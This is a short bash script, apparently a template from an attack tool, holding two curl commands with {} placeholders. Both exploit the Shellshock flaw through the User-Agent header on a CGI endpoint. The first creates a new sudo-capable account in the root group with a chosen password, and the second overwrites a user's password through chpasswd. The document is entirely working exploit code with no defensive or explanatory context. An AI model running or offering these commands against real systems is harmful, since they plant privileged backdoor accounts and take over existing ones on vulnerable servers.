#!/usr/bin/env bash

curl -H "user-agent: () {{ :; }}; echo; echo; /bin/bash -c 'sudo useradd -rm -d /home/{} -s /bin/bash -g root -G sudo -p $(openssl passwd -1 '{}') {}'" http://{}:80/cgi-bin/vulnerable,curl -H "user-agent: () {{ :; }}; echo; echo; /bin/bash -c 'echo {}:{} | sudo /usr/sbin/chpasswd'" http://{}:80/cgi-bin/vulnerable
